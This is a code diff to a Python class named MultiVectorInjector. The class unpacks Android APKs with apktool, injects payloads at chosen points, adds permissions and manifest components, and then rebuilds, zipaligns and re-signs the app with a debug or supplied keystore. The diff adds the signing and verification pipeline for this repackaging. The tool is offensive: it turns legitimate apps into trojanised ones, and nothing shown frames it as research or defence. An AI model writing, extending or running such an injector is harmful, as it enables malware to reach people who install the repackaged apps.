@@ -582,6 +582,105 @@ class MultiVectorInjector:
         self.workspace = workspace_dir
         self.smali_generator = SmaliCodeGenerator()
         self.native_generator = NativeLibraryGenerator()
+        # Tooling and flags
+        self.enable_apksigner = os.environ.get("ENABLE_APKSIGNER", "false").lower() == "true"
+        self.tools_dir = Path("/workspace/tools/android-sdk")
+        self.apktool_jar = Path("/workspace/tools/apktool/apktool.jar")
+        self.zipalign = self._prefer_tool("zipalign")
+        self.apksigner = self._prefer_tool("apksigner")
+        self.aapt = self._prefer_tool("aapt")
+        self.aapt2 = self._prefer_tool("aapt2")
+        self.debug_keystore = Path("/workspace/debug.keystore")
+    
+    def _prefer_tool(self, name: str) -> Optional[str]:
+        repo_path = self.tools_dir / name
+        if repo_path.exists():
+            return str(repo_path)
+        sys_path = shutil.which(name)
+        return sys_path
+    
+    def _run(self, cmd: List[str], timeout: int = 300) -> Tuple[bool, str]:
+        try:
+            proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
+            ok = proc.returncode == 0
+            out = (proc.stdout + "\n" + proc.stderr).strip()
+            return ok, out
+        except Exception as e:
+            return False, str(e)
+    
+    def _ensure_debug_keystore(self) -> bool:
+        if self.debug_keystore.exists():
+            return True
+        # Generate Android debug keystore with default android passwords
+        try:
+            ok, _ = self._run([
+                "keytool", "-genkey", "-v",
+                "-keystore", str(self.debug_keystore),
+                "-alias", "androiddebugkey",
+                "-keyalg", "RSA", "-keysize", "2048",
+                "-validity", "10000",
+                "-storepass", "android", "-keypass", "android",
+                "-dname", "CN=Android Debug,O=Android,C=US"
+            ], timeout=60)
+            return ok
+        except Exception:
+            return False
+    
+    def _zipalign_apk(self, unsigned_apk: Path) -> Path:
+        if not self.zipalign:
+            # No zipalign available; return original path
+            return unsigned_apk
+        aligned_path = unsigned_apk.with_suffix(".aligned.apk")
+        ok, _ = self._run([self.zipalign, "-v", "4", str(unsigned_apk), str(aligned_path)], timeout=120)
+        return aligned_path if ok and aligned_path.exists() else unsigned_apk
+    
+    def _apksigner_sign(self, apk_path: Path, sign_cfg: Dict[str, str]) -> bool:
+        if not self.apksigner:
+            return False
+        ks = sign_cfg.get("keystore_path") or str(self.debug_keystore)
+        alias = sign_cfg.get("key_alias") or "androiddebugkey"
+        ksp = sign_cfg.get("keystore_password") or "android"
+        kpp = sign_cfg.get("key_password") or "android"
+        # apksigner sign
+        cmd = [
+            self.apksigner, "sign",
+            "--ks", ks,
+            "--ks-key-alias", alias,
+            "--ks-pass", f"pass:{ksp}",
+            "--key-pass", f"pass:{kpp}",
+            str(apk_path)
+        ]
+        ok, _ = self._run(cmd, timeout=300)
+        if not ok:
+            return False
+        # verify
+        return self._apksigner_verify(apk_path)
+    
+    def _apksigner_verify(self, apk_path: Path) -> bool:
+        if not self.apksigner:
+            return False
+        ok, _ = self._run([self.apksigner, "verify", "--verbose", str(apk_path)], timeout=60)
+        return ok
+    
+    def _jarsigner_sign(self, apk_path: Path, sign_cfg: Dict[str, str]) -> bool:
+        # Fallback legacy signing using jarsigner
+        ks = sign_cfg.get("keystore_path") or str(self.debug_keystore)
+        alias = sign_cfg.get("key_alias") or "androiddebugkey"
+        ksp = sign_cfg.get("keystore_password") or "android"
+        kpp = sign_cfg.get("key_password") or "android"
+        ok, _ = self._run([
+            "jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
+            "-keystore", ks, "-storepass", ksp, "-keypass", kpp,
+            str(apk_path), alias
+        ], timeout=300)
+        return ok
+    
+    def _aapt_badging_ok(self, apk_path: Path) -> bool:
+        tool = self.aapt2 or self.aapt
+        if not tool:
+            return True  # no tool to check, do not block
+        ok, _ = self._run([tool, "dump", "badging", str(apk_path)], timeout=60)
+        return ok
     
     def analyze_injection_vectors(self, apk_path: Path, analysis_result: Dict[str, Any]) -> List[InjectionPoint]:
         """Analyze and identify optimal injection vectors"""
@@ -732,7 +831,7 @@ class MultiVectorInjector:
         )
     
     def inject_payload(self, apk_path: Path, output_path: Path, 
-                      injection_strategy: InjectionStrategy) -> bool:
+                      injection_strategy: InjectionStrategy, sign_config: Optional[Dict[str, str]] = None) -> bool:
         """Execute multi-vector payload injection"""
         
         try:
@@ -748,29 +847,29 @@ class MultiVectorInjector:
             for injection_point in injection_strategy.injection_points:
                 success = self._inject_at_point(extract_dir, injection_point, injection_strategy)
                 if not success:
-                    print(f"Failed to inject at {injection_point.target_name}")
+                    print(f"Injection failed at point: {injection_point.location_type}:{injection_point.target_name}")
             
-            # Add required permissions
+            # Add required permissions and components
             self._add_required_permissions(extract_dir, injection_strategy)
-            
-            # Add new components to manifest
             self._add_manifest_components(extract_dir, injection_strategy)
             
-            # Recompile APK
-            success = self._recompile_apk(extract_dir, output_path)
+            # Recompile + align + sign
+            success = self._recompile_apk(extract_dir, output_path, sign_config or {})
             
-            # Cleanup
-            shutil.rmtree(temp_dir, ignore_errors=True)
+            # Cleanup temp dir (best-effort)
+            try:
+                shutil.rmtree(temp_dir, ignore_errors=True)
+            except Exception:
+                pass
             
             return success
-            
         except Exception as e:
-            print(f"Injection failed: {e}")
+            print(f"Error in inject_payload: {e}")
             return False
     
     def _extract_apk(self, apk_path: Path, extract_dir: Path):
         """Extract APK using apktool"""
-        apktool_path = "/workspace/tools/apktool/apktool.jar"
+        apktool_path = str(self.apktool_jar)
         if not Path(apktool_path).exists():
             raise Exception("Apktool not found")
         
@@ -975,52 +1074,52 @@ class MultiVectorInjector:
                              content[app_end:])
                 manifest_file.write_text(new_content)
     
-    def _recompile_apk(self, extract_dir: Path, output_path: Path) -> bool:
-        """Recompile APK using apktool"""
-        
-        apktool_path = "/workspace/tools/apktool/apktool.jar"
-        
-        cmd = [
-            "java", "-jar", apktool_path, "b",
-            str(extract_dir), "-o", str(output_path)
-        ]
-        
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
-        
-        if result.returncode == 0:
-            # Sign the APK
-            return self._sign_apk(output_path)
-        else:
-            print(f"Recompilation failed: {result.stderr}")
+    def _recompile_apk(self, extract_dir: Path, output_path: Path, sign_cfg: Optional[Dict[str, str]] = None) -> bool:
+        """Recompile APK using apktool, then zipalign and sign (apksigner if enabled, else jarsigner)."""
+        sign_cfg = sign_cfg or {}
+        # Build unsigned APK
+        apktool_path = str(self.apktool_jar)
+        ok, out = self._run(["java", "-jar", apktool_path, "b", str(extract_dir), "-o", str(output_path)], timeout=900)
+        if not ok or not output_path.exists():
+            print(f"Recompilation failed")
             return False
-    
-    def _sign_apk(self, apk_path: Path) -> bool:
-        """Sign APK with debug keystore"""
         
-        try:
-            debug_keystore = "/workspace/debug.keystore"
-            
-            # Create debug keystore if it doesn't exist
-            if not Path(debug_keystore).exists():
-                subprocess.run([
-                    "keytool", "-genkey", "-v", "-keystore", debug_keystore,
-                    "-alias", "androiddebugkey", "-keyalg", "RSA", "-keysize", "2048",
-                    "-validity", "10000", "-keypass", "android", "-storepass", "android",
-                    "-dname", "CN=Android Debug,O=Android,C=US"
-                ], check=True, capture_output=True)
-            
-            # Sign APK
-            subprocess.run([
-                "jarsigner", "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
-                "-keystore", debug_keystore, "-storepass", "android",
-                "-keypass", "android", str(apk_path), "androiddebugkey"
-            ], check=True, capture_output=True)
-            
-            return True
-            
-        except subprocess.CalledProcessError as e:
-            print(f"APK signing failed: {e}")
+        # Ensure keystore exists (debug by default)
+        if not sign_cfg.get("keystore_path"):
+            self._ensure_debug_keystore()
+        
+        # Zipalign before signing
+        aligned = self._zipalign_apk(output_path)
+        if aligned != output_path:
+            try:
+                # Replace original with aligned
+                output_path.unlink(missing_ok=True)  # type: ignore
+                aligned.rename(output_path)
+            except Exception:
+                pass
+        
+        # Select signing method
+        signed_ok = False
+        if self.enable_apksigner and self.apksigner:
+            signed_ok = self._apksigner_sign(output_path, sign_cfg)
+            if not signed_ok:
+                print("apksigner signing failed; attempting fallback jarsigner")
+        if not signed_ok:
+            # Fallback to jarsigner
+            signed_ok = self._jarsigner_sign(output_path, sign_cfg)
+            if signed_ok and self.apksigner:
+                # If apksigner exists, still verify
+                signed_ok = self._apksigner_verify(output_path) or signed_ok
+        
+        if not signed_ok:
             return False
+        
+        # Post-build validation (non-verbose)
+        if not self._aapt_badging_ok(output_path):
+            print("aapt/aapt2 badging failed")
+            return False
+        
+        return True
 
 # Export main classes
 __all__ = [
